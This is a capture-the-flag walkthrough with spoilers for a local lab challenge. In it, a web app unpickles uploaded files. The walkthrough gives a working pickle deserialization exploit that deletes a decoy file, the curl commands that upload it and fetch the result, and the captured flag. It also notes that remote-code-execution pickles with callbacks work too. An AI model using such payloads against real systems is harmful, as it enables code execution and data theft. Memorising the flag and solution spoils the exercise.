# SOLUTION — cedar (walkthrough, spoilers + flag)

Attack Drills series · `deser/` · entry `http://127.0.0.1:18943`.
Commands assume the shot is armed and reachable on `127.0.0.1`
(`cp .env.example .env && docker compose up -d --build`). The flag value
below is the field-verified run's value, reproduced exactly as captured
(flags are public by policy; your own `FLAG` build arg will differ).

---

1. The page shows "The current flag is: `this is just the decoy`" and prints
   the reading code verbatim: `if os.path.exists('decoy.txt'): flag =
   open('decoy.txt') else: flag = open('flag.txt')`. The upload endpoint
   `POST /` (field `pickle_file`) runs `pickle.loads()` on your bytes —
   arbitrary code on load.

2. Craft a pickle that deletes the decoy instead of exfiltrating (the app
   hands you the exact branch to break):

   ```bash
   python3 -c "import pickle,os;open('evil.pkl','wb').write( \
     pickle.dumps(type('x',(),{'__reduce__':lambda s:(os.remove,('decoy.txt',))})()))"
   curl -s -F pickle_file=@evil.pkl http://127.0.0.1:18943/ -o /dev/null
   ```

3. Reload the front page — `decoy.txt` no longer exists, so the code reads
   the real file:

   ```bash
   curl -s http://127.0.0.1:18943/ | grep -o 'FLAG{[^<]*'
   ```

   ```
   FLAG{xbow_cedar_fb865ac56af522ef3520d021}}
   ```

> Field note: any RCE pickle also works (`popen` + DNS/HTTP callback), but
> deleting `decoy.txt` is the one-packet solve. The decoy is baked into the
> image, so `RESET.sh` re-arms the round for the next shooter.

---


---

## Flag (field-verified run)

```
FLAG{xbow_cedar_fb865ac56af522ef3520d021}}
```

Location: app dir `flag.txt` (behind `decoy.txt`).
